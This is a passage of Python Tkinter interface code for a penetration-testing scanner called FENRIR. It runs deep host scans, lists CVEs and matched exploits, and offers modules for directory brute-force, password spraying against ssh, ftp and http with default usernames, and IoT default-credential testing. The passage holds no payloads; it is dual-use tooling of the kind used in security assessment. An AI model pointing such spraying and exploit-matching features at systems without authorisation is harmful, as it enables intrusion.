        except Exception as exc:
            log.debug(f"[topology] open_host_in_results error: {exc}")

    def _start_deep_scan(self) -> None:
        if not self._disc_selected:
            messagebox.showwarning("Deep Scan",
                "No hosts selected.\n\n"
                "Run Discovery first, then tick the hosts you want to scan deeply.")
            return
        if self._net_scan_thread and self._net_scan_thread.is_alive():
            messagebox.showwarning("Busy", "A scan is already running.")
            return

        # Clear previous deep scan results
        self._net_host_tree.delete(*self._net_host_tree.get_children())
        self._net_host_data.clear()
        self._net_host_rows.clear()
        for tree in [self._net_svc_tree, self._net_vuln_tree, self._net_exp_tree]:
            tree.delete(*tree.get_children())
        self._net_info_text.configure(state="normal")
        self._net_info_text.delete("1.0", tk.END)
        self._net_info_text.configure(state="disabled")

        self._net_cancel_event.clear()
        self._net_scan_btn.configure(state="disabled")
        self._net_stop_btn.configure(state="normal")
        self._net_status_label.configure(text="Starting…", fg=ACCENT)

        targets    = ",".join(sorted(self._disc_selected))
        # Resolve output directory — respect user's custom path if set
        user_net_dir = self._net_output_var.get().strip()
        if user_net_dir and user_net_dir != str(RESULTS_DIR):
            try:
                from datetime import datetime
                ts         = datetime.now().strftime("%Y-%m-%d_%H-%M")
                label      = targets.replace(",", "_")[:40]
                output_dir = str(Path(user_net_dir) / f"{ts}_{label}_network")
                Path(output_dir).mkdir(parents=True, exist_ok=True)
            except Exception:
                output_dir = user_net_dir
        else:
            try:
                label      = targets.replace(",", "_")[:40]
                output_dir = str(make_result_dir(label, "network"))
            except Exception:
                output_dir = str(RESULTS_DIR)
        self._net_output_var.set(output_dir)
        log.info(f"Network scan output: {output_dir}")
        modules    = {k for k, v in self._net_mod_vars.items() if v.get()}

        self._net_scan_thread = threading.Thread(
            target=self._run_net_in_thread,
            args=(targets, output_dir, modules),
            daemon=True,
        )
        self._net_scan_thread.start()

    def _stop_net_scan(self) -> None:
        self._net_cancel_event.set()
        self._net_stop_btn.configure(state="disabled")
        self._net_status_label.configure(text="Stopping…", fg=WARN_FG)

    def _run_net_in_thread(self, targets: str, output_dir: str,
                            modules: set) -> None:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(
                self._run_net_scan_async(targets, output_dir, modules))
        except Exception as exc:
            log.error(f"Deep scan thread error: {exc}")
        finally:
            self.after(0, self._on_net_scan_done)

    def _on_net_scan_done(self) -> None:
        self._net_scan_btn.configure(state="normal")
        self._net_stop_btn.configure(state="disabled")
        total    = len(self._net_host_data)
        critical = sum(1 for h in self._net_host_data.values()
                       if h.get("critical_count", 0) > 0)
        self._net_status_label.configure(
            text=f"Done — {total} host(s), {critical} critical",
            fg=SUCCESS_FG if critical == 0 else ERR_FG)
        log.info(f"[GUI] Deep scan done — {total} host(s) in results table, "
                 f"{critical} critical. Populating Results tab…")
        if self._last_report:
            self.after(100, self._populate_results)
        # Enable topology button now we have data
        if hasattr(self, "_topology_btn"):
            self._topology_btn.configure(state="normal")

    async def _run_net_scan_async(self, targets: str, output_dir: str,
                                   modules: set) -> None:
        if NetworkScanner is None:
            log.error("NetworkScanner not available.")
            return

        report = ReportManager(
            output_dir, f"deep_scan_{targets.replace(',', '_').replace('/', '_')}")
        self._last_report = report   # makes Results tab populate after scan

        net_ports_str = self._net_ports_var.get().strip()
        net_ports = None
        if net_ports_str and self._net_mod_vars.get("port_scan",
                                                     tk.BooleanVar()).get():
            try:
                net_ports = parse_ports(net_ports_str)
            except ValueError as exc:
                log.warning(f"Invalid port spec '{net_ports_str}': {exc}")

        # Fix closure capture: default-arg binds value at call time
        def _cb(done: int, total: int, ip: str, host_dict: dict = None) -> None:
            log.debug(f"[network cb] host_assessed callback: {ip} "
                      f"ports={len((host_dict or {}).get('open_ports', []))} "
                      f"cves={(host_dict or {}).get('cve_count', 0)}")
            if host_dict is not None:
                hd = dict(host_dict)   # copy to avoid mutation after return
                self.after(0, lambda h=hd: self._on_host_assessed(h))
            self.after(0, lambda d=done, t=total, i=ip:
                       self._net_status_label.configure(
                           text=f"Assessing {d}/{t}: {i}…", fg=ACCENT))

        summary = await NetworkScanner().run(
            targets,
            modules=modules,
            max_concurrent_hosts=self._net_concurrency_var.get(),
            port_timeout=self._net_port_timeout_var.get(),
            skip_discovery=True,   # targets already confirmed live from discovery
            ports=net_ports,
            include_mobile=self._net_mod_vars.get("mobile",
                           tk.BooleanVar(value=True)).get(),
            include_iot=self._net_mod_vars.get("iot",
                        tk.BooleanVar(value=True)).get(),
            report=report,
            progress_callback=_cb,
            cancel_event=self._net_cancel_event,
        )
        report.finalize()
        if summary:
            live  = summary.get("live_hosts", 0)
            cves  = summary.get("total_cves", 0)
            dur   = summary.get("summary", {}).get("duration_s", 0)
            log.info(f"Deep scan complete — {live} hosts, {cves} CVEs, {dur:.0f}s")

    def _on_host_assessed(self, host: dict) -> None:
        ip          = host.get("ip", "?")
        hostname    = host.get("hostname", "")
        os_str      = host.get("os_name", "Unknown")
        if host.get("os_version"):
            os_str += f" {host['os_version']}"
        device_type = host.get("device_type", "unknown")
        open_ports  = len(host.get("open_ports", []))
        cve_count   = host.get("cve_count", 0)
        critical    = host.get("critical_count", 0)
        status      = host.get("status", "done")

        tag = ("critical" if critical > 0 else
               "high"     if cve_count > 0 else "ok")
        values = (ip, hostname, os_str, device_type,
                  open_ports, cve_count, critical, status)

        if ip in self._net_host_rows:
            iid = self._net_host_rows[ip]
            self._net_host_tree.item(iid, values=values, tags=(tag,))
        else:
            iid = self._net_host_tree.insert("", tk.END, values=values, tags=(tag,))
            self._net_host_rows[ip] = iid
        self._net_host_data[ip] = host

    def _on_net_host_select(self, event) -> None:
        sel = self._net_host_tree.selection()
        if not sel:
            return
        row = self._net_host_tree.item(sel[0], "values")
        ip  = row[0] if row else None
        if not ip or ip not in self._net_host_data:
            return
        host = self._net_host_data[ip]

        self._net_svc_tree.delete(*self._net_svc_tree.get_children())
        for svc in host.get("services", []):
            self._net_svc_tree.insert("", tk.END, values=(
                svc.get("port", ""), svc.get("name", ""),
                svc.get("version", ""), (svc.get("banner", "") or "")[:200]))

        self._net_vuln_tree.delete(*self._net_vuln_tree.get_children())
        for cve in host.get("cves", []):
            sev = (cve.get("severity") or "N/A").upper()
            self._net_vuln_tree.insert("", tk.END, tags=(sev,), values=(
                cve.get("id") or cve.get("cve_id", ""),
                cve.get("score", ""), sev,
                cve.get("service", ""),
                (cve.get("description", "") or "")[:200]))

        self._net_exp_tree.delete(*self._net_exp_tree.get_children())
        for exp in host.get("exploits", []):
            iid = self._net_exp_tree.insert("", tk.END, values=(
                exp.get("edb_id", exp.get("id", "")),
                (exp.get("title", "") or "")[:120],
                exp.get("type", ""), exp.get("platform", ""),
                ", ".join(exp.get("cve_ids", []) or [])
                    if isinstance(exp.get("cve_ids"), list)
                    else str(exp.get("cve_ids", ""))))
            self._exploit_findings[iid] = exp
        self._net_exp_tree.bind("<Double-1>",
            lambda e: self._show_exploit_guide(self._net_exp_tree))

        self._net_info_text.configure(state="normal")
        self._net_info_text.delete("1.0", tk.END)
        lines = [
            f"IP Address   : {ip}",
            f"Hostname     : {host.get('hostname', 'N/A')}",
            f"MAC          : {host.get('mac', 'N/A')}",
            f"Vendor       : {host.get('vendor', 'N/A')}",
            f"Device Type  : {host.get('device_type', 'unknown')}",
            f"Device Sub   : {host.get('device_subtype', '')}",
            "",
            f"OS Name      : {host.get('os_name', 'Unknown')}",
            f"OS Version   : {host.get('os_version', 'N/A')}",
            f"OS Family    : {host.get('os_family', 'N/A')}",
            f"CPE          : {host.get('cpe', 'N/A')}",
            "",
            f"Open Ports   : {', '.join(str(p) for p in host.get('open_ports', []))}",
            f"CVEs found   : {host.get('cve_count', 0)}",
            f"  Critical   : {host.get('critical_count', 0)}",
            f"  High       : {host.get('high_count', 0)}",
            f"Exploits     : {len(host.get('exploits', []))}",
        ]
        android = [f for f in host.get("android_findings", [])]
        if android:
            lines += ["", "── Android Findings ──"]
            for f_item in android:
                lines.append(f"  [{f_item.get('severity','INFO')}] "
                              f"{f_item.get('check','')}: {f_item.get('detail','')}")
        self._net_info_text.insert(tk.END, "\n".join(lines))
        self._net_info_text.configure(state="disabled")

    def _sort_net_tree(self, col: str) -> None:
        rows = [(self._net_host_tree.set(iid, col), iid)
                for iid in self._net_host_tree.get_children("")]
        try:
            rows.sort(key=lambda x: float(x[0]) if x[0].replace(".", "").isdigit()
                      else x[0].lower())
        except Exception:
            rows.sort(key=lambda x: x[0].lower())
        for idx, (_, iid) in enumerate(rows):
            self._net_host_tree.move(iid, "", idx)

    # ─── Scan tab ────────────────────────────────────────────────────────────
    def _build_scan_tab(self, parent: ttk.Frame) -> None:
        paned = ttk.PanedWindow(parent, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)

        left = ttk.Frame(paned, width=300)
        paned.add(left, weight=0)
        self._build_left_panel(left)

        right = ttk.Frame(paned)
        paned.add(right, weight=1)
        self._build_output_panel(right)

    def _build_left_panel(self, parent: ttk.Frame) -> None:
        canvas = tk.Canvas(parent, bg=PANEL_BG, highlightthickness=0)
        scroll = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=canvas.yview)
        canvas.configure(yscrollcommand=scroll.set)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        inner    = ttk.Frame(canvas)
        inner_id = canvas.create_window((0, 0), window=inner, anchor="nw")

        def _on_frame_configure(e):
            canvas.configure(scrollregion=canvas.bbox("all"))
        def _on_canvas_configure(e):
            canvas.itemconfig(inner_id, width=e.width)

        inner.bind("<Configure>", _on_frame_configure)
        canvas.bind("<Configure>", _on_canvas_configure)

        # Mouse-wheel scroll
        def _on_wheel(e):
            canvas.yview_scroll(int(-1 * (e.delta / 120)), "units")
        canvas.bind_all("<MouseWheel>", _on_wheel)

        PAD = {"padx": 6, "pady": 4, "fill": tk.X}

        # Logo
        logo_path = self._asset["logo"]
        if os.path.exists(logo_path):
            try:
                img = Image.open(logo_path).resize((72, 72), Image.Resampling.LANCZOS)
                self._logo_img = ImageTk.PhotoImage(img)
                tk.Label(inner, image=self._logo_img, bg=PANEL_BG).pack(pady=(8, 0))
            except Exception:
                pass
        tk.Label(inner, text="FENRIR", bg=PANEL_BG, fg=ACCENT,
                 font=("Helvetica", 15, "bold")).pack()

        # ── Scan Profile ─────────────────────────────────────────────────────
        pf = ttk.LabelFrame(inner, text="Scan Profile", padding=8)
        pf.pack(**PAD)
        pf.columnconfigure(1, weight=1)

        ttk.Label(pf, text="Profile:").grid(row=0, column=0, sticky="w", padx=(0, 4))
        self._profile_var = tk.StringVar(value="General Network")
        profile_cb = ttk.Combobox(pf, textvariable=self._profile_var,
                                   values=["General Network", "Android Device",
                                           "Web Application", "Internal Network",
                                           "IoT / Embedded", "Custom"],
                                   state="readonly", width=18)
        profile_cb.grid(row=0, column=1, sticky="ew")
        profile_cb.bind("<<ComboboxSelected>>", lambda e: self._apply_profile())

        ttk.Button(pf, text="Apply", command=self._apply_profile).grid(
            row=0, column=2, padx=(4, 0))

        self._profile_note = tk.Label(pf, text="", bg=PANEL_BG, fg=DEBUG_FG,
                                       font=("Helvetica", 8), wraplength=240,
                                       justify="left")
        self._profile_note.grid(row=1, column=0, columnspan=3, sticky="w", pady=(2, 0))

        # ── Target ────────────────────────────────────────────────────────────
        tf = ttk.LabelFrame(inner, text="Target", padding=8)
        tf.pack(**PAD)
        tf.columnconfigure(1, weight=1)
        ttk.Label(tf, text="Host/IP:").grid(row=0, column=0, sticky="w", padx=(0, 4))
        self._target_var = tk.StringVar(value="192.168.1.1")
        self._target_var.trace_add("write", lambda *_: self._on_target_change())
        ttk.Entry(tf, textvariable=self._target_var).grid(row=0, column=1, sticky="ew")

        self._target_advisory = tk.Label(tf, text="", bg=PANEL_BG, fg=WARN_FG,
                                          font=("Helvetica", 8), wraplength=240,
                                          justify="left")
        self._target_advisory.grid(row=1, column=0, columnspan=2, sticky="w", pady=(2, 0))

        # Module timeout (global)
        ttk.Label(tf, text="Module timeout (s):").grid(row=2, column=0, sticky="w",
                                                        padx=(0, 4), pady=(4, 0))
        self._module_timeout_var = tk.IntVar(value=300)
        ttk.Spinbox(tf, from_=30, to=1800, textvariable=self._module_timeout_var,
                    width=6).grid(row=2, column=1, sticky="w", pady=(4, 0))

        # Modules
        mf = ttk.LabelFrame(inner, text="Modules", padding=8)
        mf.pack(**PAD)

        MODULE_DEFS = [
            ("port_scan",       "Port Scan",              True),
            ("vuln_scan",       "Vulnerability Scan",     True),
            ("web_scan",        "Web Recon",              False),
            ("dir_brute",       "Directory Brute-force",  False),
            ("tech_detect",     "Tech Detection",         False),
            ("subdomain_scan",  "Subdomain Enumeration",  False),
            ("dns_scan",        "DNS Scan",               False),
            ("whois_scan",      "WHOIS Lookup",           False),
            ("osint_scan",      "OSINT Scan",             False),
            ("threat_intel",    "Threat Intelligence",    False),
            ("exploit_search",  "Exploit Search (manual query)",  False),
            ("pass_spray",      "Password Spray",         False),
            ("iot_scan",        "IoT Scan",               False),
            ("ot_scan",         "OT/ICS Passive Scan",   False),
            ("mobile_scan",     "Mobile App Analysis",   False),
            ("rf_scan",         "RF Scan",                False),
        ]

        self._module_vars: dict[str, tk.BooleanVar] = {}
        for key, label, default in MODULE_DEFS:
            var = tk.BooleanVar(value=default)
            self._module_vars[key] = var
            registry_name = _module_key_to_class(key)
            available     = MODULE_REGISTRY.get(registry_name) is not None
            heavy_mark    = "  ⚡" if key in HEAVY_MODULES else ""
            cb = ttk.Checkbutton(mf, text=label + heavy_mark, variable=var)
            if not available:
                cb.configure(state="disabled")
                var.set(False)
            cb.pack(anchor="w")

        tk.Label(mf, text="⚡ = memory-intensive (max 2 concurrent)",
                 bg=PANEL_BG, fg=DEBUG_FG, font=("Helvetica", 8)).pack(anchor="w", pady=(4, 0))
        tk.Label(mf, text="★ CVE→Exploit matching is automatic (no tick needed)",
                 bg=PANEL_BG, fg=SUCCESS_FG, font=("Helvetica", 8)).pack(anchor="w")

        # Advanced options
        af = ttk.LabelFrame(inner, text="Advanced Options", padding=8)
        af.pack(**PAD)
        af.columnconfigure(1, weight=1)

        row = 0
        def _adv_label(text, r):
            ttk.Label(af, text=text).grid(row=r, column=0, sticky="w", padx=(0, 4), pady=2)

        _adv_label("Ports (-p):", row)
        self._ports_var = tk.StringVar(value="")
        ttk.Entry(af, textvariable=self._ports_var).grid(row=row, column=1, sticky="ew"); row += 1

        _adv_label("Port timeout (s):", row)
        self._port_timeout_var = tk.DoubleVar(value=1.5)
        ttk.Spinbox(af, from_=0.5, to=10.0, increment=0.5,
                    textvariable=self._port_timeout_var,
                    width=6).grid(row=row, column=1, sticky="w"); row += 1

        _adv_label("Skip host-up check:", row)
        self._skip_hostup_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(af, variable=self._skip_hostup_var,
                        text="(scan even if no ping response)").grid(
            row=row, column=1, sticky="w"); row += 1

        _adv_label("CVE limit:", row)
        self._cve_limit_var = tk.IntVar(value=5)
        ttk.Spinbox(af, from_=1, to=50, textvariable=self._cve_limit_var,
                    width=6).grid(row=row, column=1, sticky="w"); row += 1

        _adv_label("Wordlist:", row)
        wl_frame = ttk.Frame(af)
        wl_frame.grid(row=row, column=1, sticky="ew"); wl_frame.columnconfigure(0, weight=1)
        self._wordlist_var = tk.StringVar(value="")
        ttk.Entry(wl_frame, textvariable=self._wordlist_var).grid(row=0, column=0, sticky="ew")
        ttk.Button(wl_frame, text="…", command=self._browse_wordlist).grid(row=0, column=1, padx=(2, 0))
        row += 1

        _adv_label("OT duration (s):", row)
        self._ot_duration_var = tk.IntVar(value=30)
        ttk.Spinbox(af, from_=5, to=300, textvariable=self._ot_duration_var,
                    width=6).grid(row=row, column=1, sticky="w"); row += 1

        _adv_label("RF freq range:", row)
        self._rf_range_var = tk.StringVar(value="24M:1.7G")
        ttk.Entry(af, textvariable=self._rf_range_var).grid(row=row, column=1, sticky="ew"); row += 1

        _adv_label("RF threshold (dBm):", row)
        self._rf_threshold_var = tk.DoubleVar(value=-20.0)
        ttk.Spinbox(af, from_=-80, to=0, increment=1,
                    textvariable=self._rf_threshold_var,
                    width=6).grid(row=row, column=1, sticky="w"); row += 1

        _adv_label("Spray service:", row)
        self._spray_service_var = tk.StringVar(value="ssh")
        ttk.Combobox(af, textvariable=self._spray_service_var,
                     values=["ssh", "ftp", "http-basic", "http-form"],
                     state="readonly", width=10).grid(row=row, column=1, sticky="w"); row += 1

        _adv_label("Spray users:", row)
        self._spray_users_var = tk.StringVar(value="admin,root,user")
        ttk.Entry(af, textvariable=self._spray_users_var).grid(row=row, column=1, sticky="ew"); row += 1

        _adv_label("Spray password:", row)
        self._spray_pass_var = tk.StringVar(value="")
        ttk.Entry(af, textvariable=self._spray_pass_var,
                  show="*").grid(row=row, column=1, sticky="ew"); row += 1

        _adv_label("APK path:", row)
        apk_frame = ttk.Frame(af)
        apk_frame.grid(row=row, column=1, sticky="ew"); apk_frame.columnconfigure(0, weight=1)
        self._apk_var = tk.StringVar(value="")
        ttk.Entry(apk_frame, textvariable=self._apk_var).grid(row=0, column=0, sticky="ew")
        ttk.Button(apk_frame, text="…", command=self._browse_apk).grid(row=0, column=1, padx=(2, 0))
        row += 1

        _adv_label("Exploit query:", row)
        self._exploit_query_var = tk.StringVar(value="")
        ttk.Entry(af, textvariable=self._exploit_query_var).grid(row=row, column=1, sticky="ew"); row += 1

        # Output folder
        of = ttk.LabelFrame(inner, text="Output", padding=8)
        of.pack(**PAD)
        of.columnconfigure(0, weight=1)
        self._output_dir_var = tk.StringVar(value=str(RESULTS_DIR))
        out_row = ttk.Frame(of)
        out_row.pack(fill=tk.X)
        out_row.columnconfigure(0, weight=1)
        ttk.Entry(out_row, textvariable=self._output_dir_var).grid(row=0, column=0, sticky="ew")
        ttk.Button(out_row, text="…",
                   command=self._browse_output).grid(row=0, column=1, padx=(2, 0))
        ttk.Label(of, text="Leave blank to auto-name: Results/YYYY-MM-DD_HH-MM_target/  |  Or enter a custom path",
                  font=("Helvetica", 8), foreground=DEBUG_FG).pack(anchor="w", pady=(2, 0))

        # Start / Stop
        btn_frame = ttk.Frame(inner)
        btn_frame.pack(**PAD)
        btn_frame.columnconfigure(0, weight=1)
        btn_frame.columnconfigure(1, weight=1)

        self._start_btn = ttk.Button(btn_frame, text="▶  Start Scan",
                                      style="Accent.TButton",
                                      command=self._start_scan)
        self._start_btn.grid(row=0, column=0, sticky="ew", padx=(0, 3))

        self._stop_btn = ttk.Button(btn_frame, text="■  Stop",
                                     style="Stop.TButton",
                                     command=self._stop_scan,
                                     state="disabled")
        self._stop_btn.grid(row=0, column=1, sticky="ew", padx=(3, 0))

    # ─── Scan profiles ───────────────────────────────────────────────────────

    # Profile definitions: (ports_str, modules_on, note)
    _PROFILES: dict[str, tuple[str, list[str], str]] = {
        "General Network": (
            "",
            ["port_scan", "vuln_scan"],
            "Scans top-1000 ports, CVE lookup, auto exploit match.",
        ),
        "Android Device": (
            "5555,5554,5556,5558,8080,443,80",
            ["port_scan", "vuln_scan"],
            "Targets ADB-over-TCP ports. AndroidScanner auto-triggers on port 5555.\n"
            "Ensure ADB is enabled on device: Settings → Developer Options → ADB over network.",
        ),
        "Web Application": (
            "80,443,8080,8443,8000,8888,3000,4443,9443",
            ["port_scan", "vuln_scan", "web_scan", "tech_detect", "dir_brute"],
            "Web ports only. Includes header analysis, tech fingerprint, dir brute-force.",
        ),
        "Internal Network": (
            "",
            ["port_scan", "vuln_scan", "dns_scan", "whois_scan"],
            "Full port scan + DNS/WHOIS. Note: WHOIS/VirusTotal/OSINT auto-skipped for private IPs.",
        ),
        "IoT / Embedded": (
            "21,22,23,80,443,502,1883,4786,5683,8080,8883,47808",
            ["port_scan", "vuln_scan", "iot_scan"],
            "Common IoT/ICS ports. IoT default-cred testing and MQTT checks included.",
        ),
        "Custom": (
            "",
            [],
            "Configure ports and modules manually.",
        ),
    }

    def _apply_profile(self) -> None:
        """Configure ports and module checkboxes for the selected scan profile."""
        profile = self._profile_var.get()
        if profile not in self._PROFILES:
            return

        ports_str, modules_on, note = self._PROFILES[profile]

        # Set ports
        self._ports_var.set(ports_str)

        if profile != "Custom":
            # Reset all module checkboxes, then enable the profile set
            for key, var in self._module_vars.items():
                var.set(key in modules_on)

        self._profile_note.configure(text=note)
        log.info(f"Scan profile applied: {profile}")

    def _on_target_change(self) -> None:
        """Show advisory when target looks like a private/RFC1918 address."""
        target = self._target_var.get().strip()
        if _is_private_ip(target):
            self._target_advisory.configure(
                text="⚠ Private IP: WHOIS, VirusTotal, OSINT and Subdomain "
                     "modules will be skipped automatically."
            )
        elif target:
            self._target_advisory.configure(text="")

    def _build_output_panel(self, parent: ttk.Frame) -> None:
        header = ttk.Frame(parent)
        header.pack(fill=tk.X, padx=6, pady=(6, 0))
        ttk.Label(header, text="Live Output",
                  font=("Helvetica", 11, "bold")).pack(side=tk.LEFT)

        # Search within live output
        self._log_search_var = tk.StringVar()
        self._log_search_var.trace_add("write", lambda *_: self._highlight_log_search())
        ttk.Entry(header, textvariable=self._log_search_var,
                  width=20).pack(side=tk.RIGHT, padx=(2, 0))
        ttk.Label(header, text="Search:").pack(side=tk.RIGHT)
        ttk.Button(header, text="Clear",
                   command=self._clear_output).pack(side=tk.RIGHT, padx=(0, 6))

        self._output_text = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            state="disabled",
            bg="#11111b",
            fg=TEXT_FG,
            insertbackground=TEXT_FG,
            font=("Courier", 10),
            relief="flat",
        )
        self._output_text.pack(fill=tk.BOTH, expand=True, padx=6, pady=6)

        self._output_text.tag_configure("WARNING",  foreground=WARN_FG)
        self._output_text.tag_configure("ERROR",    foreground=ERR_FG)
        self._output_text.tag_configure("CRITICAL", foreground=CRIT_FG,
                                         font=("Courier", 10, "bold"))
        self._output_text.tag_configure("SUCCESS",  foreground=SUCCESS_FG)
        self._output_text.tag_configure("INFO",     foreground=TEXT_FG)
        self._output_text.tag_configure("DEBUG",    foreground=DEBUG_FG)
        self._output_text.tag_configure("SEARCH_HL",
                                         background=WARN_FG, foreground=DARK_BG)

    # ─── Results tab ─────────────────────────────────────────────────────────

    def _build_results_tab(self, parent: ttk.Frame) -> None:
        """Results notebook with Ports / Vulnerabilities / Exploits / Recon / Threats tabs."""

        # Global search bar at the top
        search_row = ttk.Frame(parent)
        search_row.pack(fill=tk.X, padx=8, pady=(6, 2))
        ttk.Label(search_row, text="Search results:",
                  font=("Helvetica", 9, "bold")).pack(side=tk.LEFT, padx=(0, 4))
        self._results_search_var = tk.StringVar()
        self._results_search_var.trace_add("write", lambda *_: self._filter_results())
        ttk.Entry(search_row, textvariable=self._results_search_var,
                  width=40).pack(side=tk.LEFT)
        ttk.Button(search_row, text="Clear search",
                   command=lambda: self._results_search_var.set("")).pack(side=tk.LEFT, padx=4)
        self._results_count_label = ttk.Label(search_row, text="")
        self._results_count_label.pack(side=tk.RIGHT)

        # Sub-notebook
        rn = ttk.Notebook(parent)
        rn.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))
        self._results_notebook = rn

        self._ports_tree      = self._make_results_tree(rn, "  Ports  ",
            columns=["Port", "Protocol", "Service", "Version", "State"],
            col_widths=[70, 70, 120, 180, 60])

        self._vulns_tree      = self._make_results_tree(rn, "  Vulnerabilities  ",
            columns=["CVE ID", "Score", "Severity", "Port", "Service", "Description"],
            col_widths=[120, 55, 75, 60, 100, 350],
            sortable_col="Score")

        self._exploits_tree   = self._make_results_tree(rn, "  Exploits  ",
            columns=["ID", "Title", "Type", "Platform", "CVEs", "✓", "Path"],
            col_widths=[75, 260, 80, 80, 110, 28, 240])

        self._recon_tree      = self._make_results_tree(rn, "  Recon  ",
            columns=["Category", "Key", "Value"],
            col_widths=[120, 160, 400])

        self._threats_tree    = self._make_results_tree(rn, "  Threats  ",
            columns=["Indicator", "Type", "Source", "Severity", "Details"],
            col_widths=[160, 80, 100, 80, 300])

        # Status label under each tree
        self._results_status = ttk.Label(parent, text="Run a scan to populate results.",
                                          font=("Helvetica", 9))
        self._results_status.pack(pady=(0, 4))

        # Right-click context menu for trees
        self._tree_menu = tk.Menu(self, tearoff=0, bg=PANEL_BG, fg=TEXT_FG)
        self._tree_menu.add_command(label="Copy selected",    command=self._copy_tree_selection)
        self._tree_menu.add_command(label="Show full detail", command=self._show_tree_detail)

        for tree in [self._ports_tree, self._vulns_tree, self._exploits_tree,
                     self._recon_tree, self._threats_tree]:
            tree.bind("<Button-3>", self._show_tree_context_menu)
            tree.bind("<Double-1>", lambda e: self._show_tree_detail())
        # Exploits tree gets its own double-click for the guide window
        self._exploits_tree.bind("<Double-1>",
            lambda e: self._show_exploit_guide(self._exploits_tree), add="+")

    def _make_results_tree(
        self,
        parent: ttk.Notebook,
        tab_label: str,
        columns: list[str],
        col_widths: list[int],
        sortable_col: Optional[str] = None,
    ) -> ttk.Treeview:
        """Create a scrollable Treeview and add it as a notebook tab."""
        frame = ttk.Frame(parent)
        parent.add(frame, text=tab_label)

        vsb = ttk.Scrollbar(frame, orient="vertical")
        hsb = ttk.Scrollbar(frame, orient="horizontal")
        tree = ttk.Treeview(
            frame,
            columns=columns,
            show="headings",
            yscrollcommand=vsb.set,
            xscrollcommand=hsb.set,
            selectmode="extended",
        )
        vsb.configure(command=tree.yview)
        hsb.configure(command=tree.xview)

        vsb.pack(side=tk.RIGHT,  fill=tk.Y)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)
        tree.pack(fill=tk.BOTH, expand=True)

        for col, width in zip(columns, col_widths):
            tree.heading(col, text=col, anchor="w")
            tree.column(col, width=width, anchor="w", minwidth=40)

        if sortable_col:
            tree.heading(sortable_col, text=sortable_col + " ▼",
                         command=lambda: self._sort_tree_by_score(tree, sortable_col))

        # Alternating row colours
        tree.tag_configure("odd",  background="#1a1a2e")
        tree.tag_configure("even", background=ENTRY_BG)
        tree.tag_configure("critical", foreground=CRIT_FG)
        tree.tag_configure("high",     foreground=ERR_FG)
        tree.tag_configure("medium",   foreground=WARN_FG)
        tree.tag_configure("low",      foreground=SUCCESS_FG)
        tree.tag_configure("match",    background="#2d4a1e", foreground=SUCCESS_FG)

        return tree

    # ─── Debug tab ───────────────────────────────────────────────────────────

    def _build_debug_tab(self, parent: ttk.Frame) -> None:
        """Per-module timing, memory usage, live status."""
        # Top: memory + system info bar
        info_frame = ttk.LabelFrame(parent, text="System", padding=6)
        info_frame.pack(fill=tk.X, padx=8, pady=(8, 2))

        self._mem_label    = ttk.Label(info_frame, text="Memory: –")
        self._mem_label.pack(side=tk.LEFT, padx=8)
        self._cpu_label    = ttk.Label(info_frame, text="CPU: –")
        self._cpu_label.pack(side=tk.LEFT, padx=8)
        self._thread_label = ttk.Label(info_frame, text="Threads: –")
        self._thread_label.pack(side=tk.LEFT, padx=8)

        ttk.Button(info_frame, text="Refresh",
                   command=self._refresh_system_info).pack(side=tk.RIGHT, padx=4)

        # Middle: module timing table
        timing_frame = ttk.LabelFrame(parent, text="Module Timings (last scan)", padding=6)
        timing_frame.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)

        timing_cols = ["Module", "Status", "Start", "Duration", "Note"]
        timing_widths = [160, 90, 120, 80, 300]

        vsb = ttk.Scrollbar(timing_frame, orient="vertical")
        self._timing_tree = ttk.Treeview(
            timing_frame,
            columns=timing_cols,
            show="headings",
            yscrollcommand=vsb.set,
            height=12,
        )
        vsb.configure(command=self._timing_tree.yview)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self._timing_tree.pack(fill=tk.BOTH, expand=True)

        for col, width in zip(timing_cols, timing_widths):
            self._timing_tree.heading(col, text=col, anchor="w")
            self._timing_tree.column(col, width=width, anchor="w", minwidth=40)

        self._timing_tree.tag_configure("running",  foreground=ACCENT)
        self._timing_tree.tag_configure("done_ok",  foreground=SUCCESS_FG)
        self._timing_tree.tag_configure("done_slow",foreground=WARN_FG)
        self._timing_tree.tag_configure("done_err", foreground=ERR_FG)
        self._timing_tree.tag_configure("timeout",  foreground=CRIT_FG)
        self._timing_tree.tag_configure("skipped",  foreground=SEP_FG)
        self._timing_tree.tag_configure("cancelled",foreground=DEBUG_FG)

        # Bottom: event/error log specific to debug
        log_frame = ttk.LabelFrame(parent, text="Scan Events & Errors", padding=6)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=8, pady=(2, 8))

        self._debug_text = scrolledtext.ScrolledText(
            log_frame,
            wrap=tk.WORD,
            state="disabled",
            bg="#11111b",
            fg=TEXT_FG,
            font=("Courier", 9),
            relief="flat",
            height=8,
        )
        self._debug_text.pack(fill=tk.BOTH, expand=True)
        self._debug_text.tag_configure("ERROR",   foreground=ERR_FG)
        self._debug_text.tag_configure("WARNING", foreground=WARN_FG)
        self._debug_text.tag_configure("TIMEOUT", foreground=CRIT_FG,
                                        font=("Courier", 9, "bold"))
        self._debug_text.tag_configure("INFO",    foreground=TEXT_FG)

        ttk.Button(log_frame, text="Clear",
                   command=self._clear_debug_log).pack(side=tk.RIGHT, padx=4, pady=(2, 0))

        self._refresh_system_info()
        self.after(5000, self._auto_refresh_system_info)

    # ─── Database tab ────────────────────────────────────────────────────────

    def _build_db_tab(self, parent: ttk.Frame) -> None:
        sf = ttk.LabelFrame(parent, text="Database Status", padding=10)
        sf.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
        self._db_status_text = scrolledtext.ScrolledText(
            sf, wrap=tk.WORD, state="disabled",
            bg="#11111b", fg=TEXT_FG, font=("Courier", 9), height=10)
        self._db_status_text.pack(fill=tk.BOTH, expand=True)

        bf = ttk.LabelFrame(parent, text="Build Database", padding=10)
        bf.pack(fill=tk.X, padx=8, pady=(0, 8))

        tier_row = ttk.Frame(bf)
